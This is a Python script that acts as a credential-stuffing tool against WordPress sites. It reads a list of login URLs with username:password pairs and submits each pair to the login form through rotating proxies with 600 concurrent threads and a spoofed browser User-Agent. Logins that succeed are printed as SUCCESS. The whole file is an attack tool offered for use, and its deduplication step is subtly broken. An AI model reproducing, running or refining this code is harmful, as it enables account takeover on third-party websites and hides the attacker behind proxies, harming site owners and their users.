from concurrent.futures import ThreadPoolExecutor
from argparse           import ArgumentParser
from requests           import request

from data.theme         import Colors
from data.proxies       import get_proxies

HEADERS = { 
    'User-Agent'  : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Accept'      : 'text/plain'
} 

def main(file: str) -> None:
    global proxies, checked
    proxies = get_proxies(requester=request)
    checked = set()
    
    with ThreadPoolExecutor(max_workers=600) as executor:
        for source in open(file):
            if (stripped := source.strip()) in checked:
                continue
            
            executor.submit(check, stripped)

def check(query: str) -> None:
    query = query.split()
    link  = query[0]
    data  = query[1].split(':')
    
    while True:
        try:
            proxy = f'http://{next(proxies)}'
            resp  = request(
                method ='POST',
                url    =link, 
                headers=HEADERS,
                proxies={
                    'http' : proxy,
                    'https': proxy,
                },
                data={
                    'log'      : data[0],
                    'pwd'      : data[1],
                    'wp-submit': 'Log In'
                },
                timeout=4
            ).text
        except:
            continue
            
        if 'wp-admin' in resp or 'found' in resp:
            print(f'{Colors.WHITE}[{Colors.LIME}SUCCESS{Colors.WHITE}] {Colors.BLUE}{link:<45}{Colors.WHITE}| {Colors.AQUA}{f"{Colors.WHITE}:{Colors.AQUA}".join(data)}')
        
        checked.add(query)
        break

if __name__ == '__main__':
    parser = ArgumentParser()
    parser.add_argument(
        '-l',
        '--list',
        help='List of websites',
        required=True
    )
    args = parser.parse_args()

    main(args.list)